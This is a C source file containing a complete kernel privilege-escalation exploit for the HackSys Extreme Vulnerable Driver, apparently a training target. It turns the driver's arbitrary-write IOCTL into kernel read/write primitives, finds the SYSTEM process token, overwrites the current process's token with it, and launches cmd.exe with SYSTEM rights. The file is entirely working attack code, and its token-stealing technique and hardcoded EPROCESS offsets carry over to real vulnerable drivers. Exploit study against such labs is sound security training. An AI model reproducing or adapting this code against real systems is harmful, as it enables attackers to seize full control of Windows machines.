#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <stdlib.h>

#pragma comment(lib, "Psapi.lib")

#define QWORD ULONGLONG

// Defining the IOCTL and the DeviceName
#define HEVD_IOCTL_ARBITRARY_WRITE 0x22200B
#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

// Offsets for EPROCESS structure
// dt nt!_EPROCESS UniqueProcessId ActiveProcessLinks Token
#define UNIQUE_PROCESS_ID_OFFSET 0x440ULL
#define ACTIVE_PROCESS_LINKS_OFFSET 0x448ULL
#define TOKEN_OFFSET 0x4b8ULL

// ? nt!PsInitialSystemProcess - nt
#define PS_INITIAL_SYSTEM_PROCESS_OFFSET 0x00cfc420ULL

// Defining a struct
typedef struct _WRITE_WHAT_WHERE
{
    QWORD* What;
    QWORD* Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

BOOL TriggerWriteWhatWhere(HANDLE hDevice, QWORD* what, QWORD* where)
{
    WRITE_WHAT_WHERE request = { 0 };

    request.What = what;
    request.Where = where;

    DWORD bytesReturned = 0;

    return DeviceIoControl(
        hDevice,
        HEVD_IOCTL_ARBITRARY_WRITE,
        &request,
        sizeof(request),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}

QWORD ReadQWORD(HANDLE hDevice, QWORD kernelAddress)
{
    QWORD value = 0;

    BOOL ok = TriggerWriteWhatWhere(
        hDevice,
        (QWORD*)kernelAddress,
        &value
    );

    if (!ok)
    {
        printf("[-] ReadQWORD failed at 0x%llx. Error=%lu\n", kernelAddress, GetLastError());
    }

    return value;
}

BOOL WriteQWORD(HANDLE hDevice, QWORD kernelAddress, QWORD valueToWrite)
{
    QWORD value = valueToWrite;

    BOOL ok = TriggerWriteWhatWhere(
        hDevice,
        &value,
        (QWORD*)kernelAddress
    );

    if (!ok)
    {
        printf("[-] WriteQWORD failed at 0x%llx. Error=%lu\n", kernelAddress, GetLastError());
    }

    return ok;
}


// Finding NT Base address
QWORD getBaseAddr(LPCWSTR driverName)
{
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
    {
        printf("[!] EnumDeviceDrivers failed: %lu\n", GetLastError());
        return 0;
    }

    int driverCount = cbNeeded / sizeof(drivers[0]);

    for (int i = 0; i < driverCount; i++)
    {
        WCHAR currentDriverName[MAX_PATH];

        if (GetDeviceDriverBaseNameW(
            drivers[i],
            currentDriverName,
            MAX_PATH
        ))
        {
            if (_wcsicmp(currentDriverName, driverName) == 0)
            {
                return (QWORD)drivers[i];
            }
        }
    }

    printf("[!] Could not find driver: %ws\n", driverName);
    return 0;
}

int main()
{
    printf("[+] Opening %ls\n", DEVICE_NAME);

    // Creating a handle
    HANDLE hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFileW failed. Error=%lu\n", GetLastError());
        return 1;
    }

    QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");

    if (!ntBase)
    {
        printf("[-] Failed to get ntoskrnl.exe base address\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] ntoskrnl.exe base:                  0x%llx\n", ntBase);

    QWORD psInitialSystemProcessAddress = ntBase + PS_INITIAL_SYSTEM_PROCESS_OFFSET;

    printf("[+] PsInitialSystemProcess address:     0x%llx\n", psInitialSystemProcessAddress);

    QWORD systemEprocess = ReadQWORD(hDevice, psInitialSystemProcessAddress);

    if (!systemEprocess)
    {
        printf("[-] Failed to read SYSTEM EPROCESS\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] SYSTEM EPROCESS:                    0x%llx\n", systemEprocess);

    QWORD systemToken = ReadQWORD(hDevice, systemEprocess + TOKEN_OFFSET);
    QWORD cleanSystemToken = systemToken & ~0xFULL;

    printf("[+] SYSTEM Token:                       0x%llx\n", systemToken);
    printf("[+] SYSTEM Token cleaned:               0x%llx\n", cleanSystemToken);

    DWORD currentPid = GetCurrentProcessId();

    printf("[+] Current PID:                        %lu\n", currentPid);

    QWORD currentEprocess = 0;
    QWORD current = systemEprocess;

    for (int i = 0; i < 1024; i++)
    {
        QWORD pid = ReadQWORD(hDevice, current + UNIQUE_PROCESS_ID_OFFSET);

        if ((DWORD)pid == currentPid)
        {
            currentEprocess = current;
            break;
        }

        QWORD flink = ReadQWORD(hDevice, current + ACTIVE_PROCESS_LINKS_OFFSET);

        if (!flink)
        {
            printf("[-] ActiveProcessLinks Flink is NULL\n");
            CloseHandle(hDevice);
            return 1;
        }

        current = flink - ACTIVE_PROCESS_LINKS_OFFSET;
    }

    if (!currentEprocess)
    {
        printf("[-] Failed to find current process EPROCESS\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] Current EPROCESS:                   0x%llx\n", currentEprocess);

    QWORD currentTokenAddress = currentEprocess + TOKEN_OFFSET;
    QWORD currentToken = ReadQWORD(hDevice, currentTokenAddress);

    printf("[+] Current Token address:              0x%llx\n", currentTokenAddress);
    printf("[+] Current Token before:               0x%llx\n", currentToken);

    QWORD currentTokenRefBits = currentToken & 0xFULL;
    QWORD finalToken = cleanSystemToken | currentTokenRefBits;

    printf("[+] Current Token ref bits:             0x%llx\n", currentTokenRefBits);
    printf("[+] Final token to write:               0x%llx\n", finalToken);

    if (!WriteQWORD(hDevice, currentTokenAddress, finalToken))
    {
        printf("[-] Failed to overwrite current process token\n");
        CloseHandle(hDevice);
        return 1;
    }

    QWORD verifyToken = ReadQWORD(hDevice, currentTokenAddress);

    printf("[+] Current Token after:                0x%llx\n", verifyToken);

    if ((verifyToken & ~0xFULL) == cleanSystemToken)
    {
        printf("[+] Token overwrite successful\n");
        printf("[+] Spawning cmd.exe\n");
        system("cmd.exe");
    }
    else
    {
        printf("[-] Token overwrite verification failed\n");
    }

    CloseHandle(hDevice);
    return 0;
}